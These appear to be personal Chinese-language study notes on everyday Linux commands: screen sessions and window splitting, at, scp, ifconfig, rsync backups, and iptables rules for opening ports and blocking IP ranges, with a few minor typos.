 jobs 命令的作用是显示当前终端里的后台进程状态。 

## 用screen来分屏

```shell
#启动
screen
#screen中的一切功能都需要在按下Ctrl-a之后,才有用,这里严格区分大小写
? 显示帮助#如这里就需要按下Ctrl-a之后,在按下问好

```

### 常用的组合按键

```
Ctrl + a，松开，再按 c ：创建一个新的虚拟终端。
Ctrl + a，松开，再按 w ：显示当前虚拟终端的列表。
此处的 0$ bash 1-$ bash 2*$ bash 表示此时打开了 3 个虚拟终端，都叫作 bash，编号是 0，1，2。这是因为目前终端的 Shell 是用的 Bash，之后我们第五部分会开始学习 Shell（外壳程序）。

有 *（星号）的那个虚拟终端就是我们目前所在的虚拟终端，也就是第 3 个，编号是 2。

Ctrl + a，松开，再按 A ：重命名当前虚拟终端。修改后的名字，你用 Ctrl + a，松开，再按 w 时就会看到。

Ctrl + a，松开，再按 n ：跳转到下一个虚拟终端。

Ctrl + a，松开，再按 p ：跳转到上一个虚拟终端。

Ctrl + a，松开，再按 Ctrl + a ：跳转到最近刚使用的那个虚拟终端。

Ctrl + a，松开，再按 0 ~ 9 数字键：跳转到第 0 ~ 9 号虚拟终端。

Ctrl + a，松开，再按 "（双引号）：会让你选择跳转到哪个虚拟终端。

Ctrl + a，松开，再按 k ：关闭当前终端。
```



### 分隔屏幕

#### 水平切割

```
Ctrl + a，松开，再按 S ,上下分隔屏幕
注意是大写的 S（是英语 split 的首字母，表示“分割，分离”）。如果这样操作一次，则当前虚拟终端被横向分割为上下两部分。如下图所示：
```

#### 竖直切割



```
Ctrl + a，松开，再按 | ,上下分隔屏幕
```





#### 关闭切割出来的窗口

```
只要 Ctrl + a，松开，再按大写的 X
```

### 终端和screen分离

```
Ctrl + a，松开，再按 d：分离 screen
可以看到 [detached from 2249.pts-0.oscar-laptop]

表示我们的 screen 与实际终端分离（detach 是英语“分离，挣脱”的意思）了。

之后如果你要重回 screen 中，可以输入：
screen -r
就又回到刚才的 screen 的虚拟终端里了。
```



## 定时执行命令:at

```shell
at 'date'
at now +10 minutes #10分钟后执行命令
atq 和 atrm 命令：列出和删除正在等待执行的 at 任务
```



## 不同主机直接传输文件:scp

```shell
scp source_file destination_file
这两个文件都可以用如下方式来表示：
user@ip:file_name
scp image.png oscar@89.231.45.67:/home/oscar/images/
```



## ifconfig 查询和配置网络

```
关闭 eth0 这个有线接口，之后就没有任何网络传输会在 eth0 上进行了。
sudo ifconfig eth0 down

激活 eth0 这个有线接口。
sudo ifconfig eth0 up

ifconfig eth0 192.168.120.56 netmask 255.255.255.0 broadcast 192.168.120.255
上面的命令用于给 eth0 网卡配置 IP 地址（192.168.120.56），加上子网掩码（255.255.255.0），加上广播地址（192.168.120.255）。
```

## rsync 增量备份

### 备份到同一台电脑

```
rsync -arv Images/ backups/
```



以上命令，将 Images 目录下的所有文件备份到 backups 目录下。

-arv 参数分别表示：

- -a：保留文件的所有信息，包括权限、修改日期等等。a 是 archive 的缩写，是“归档”的意思；
- -r：递归调用，表示子目录的所有文件也都包括。r 是 recursive 的缩写，是“递归的”的意思；
- -v：冗余模式，输出详细操作信息。v 是 verbose 的缩写，是“冗余的”的意思。

### 删除文件

默认地，rsync 在同步时并不会删除目标目录的文件。例如你的源目录（被同步目录）中删除了一个文件，但是用 rsync 同步时，它并不会删除同步目录中的相同文件。

如果要使 rsync 也同步删除操作。那么可以这么做：

```
rsync -arv --delete Images/ backups/
```

加上 --delete 参数就可以了。delete 是英语“删除”的意思。

### 备份到另一台电脑的目录

例如：

```
rsync -arv --delete Images/ oscar@89.231.45.67:backups/
```



## iptables



```shell
iptables -L #列出所有规则
Chain INPUT (policy ACCEPT)
target     prot opt source               destination         

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination   
```

可以看到三个区域：

- `Chain INPUT` : 对应控制“进入”的网络传输的规则，input 是英语“输入”的意思。
- `Chain FORWARD` : 对应控制“转发”的网络传输的规则，forward 是英语“转发”的意思。
- `Chain OUTPUT` : 对应控制“出去”的网络传输的规则，output 是英语“输出”的意思。

### 开放指定端口

```shell
# 允许本地回环接口（即运行本机访问本机）
iptables -A INPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT
# 允许已建立的或相关连的通行
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
# 允许所有本机向外的访问
iptables -A OUTPUT -j ACCEPT
# 允许访问 22 端口
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
# 允许访问 80 端口
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
# 允许 FTP 服务的 21 和 20 端口
iptables -A INPUT -p tcp --dport 21 -j ACCEPT
iptables -A INPUT -p tcp --dport 20 -j ACCEPT
# 如果有其它端口的话，规则也类似，稍微修改上述语句就行。
# 禁止其它未允许的规则访问（注意：如果 22 端口未加入允许规则，SSH 链接会直接断开。）
## 1）. 用 DROP 方法
iptables -A INPUT -p tcp -j DROP
## 2）. 用 REJECT 方法
iptables -A INPUT -j REJECT
iptables -A FORWARD -j REJECT
```

### 屏蔽ip

```shell
# 屏蔽单个 IP 的命令是
iptables -I INPUT -s 123.45.6.7 -j DROP
预览
# 封整个段，即从 123.0.0.1 到 123.255.255.254 的命令
iptables -I INPUT -s 123.0.0.0/8 -j DROP
# 封 IP 段从 123.45.0.1 到 123.45.255.254 的命令
iptables -I INPUT -s 124.45.0.0/16 -j DROP
# 封 IP 段从 123.45.6.1 到 123.45.6.254 的命令是
iptables -I INPUT -s 123.45.6.0/24 -j DROP
```



### 删除

```shell
# 将所有 iptables 以序号标记显示，执行：
iptables -L -n --line-numbers
# 要删除 INPUT 里序号为 8 的规则，执行：
iptables -D INPUT 8
```



### 注意

有时iptables不会开机自启动,之前设置的规则没有保存等问题,这些得我们自己设置



## nftables

> 新的防火墙子系统 / 包过滤引擎 nftables 在 Linux 3.13 中替代了有十多年历史的 iptables。iptables / netfilter 是在 2001 年加入到 2.4 内核中。 

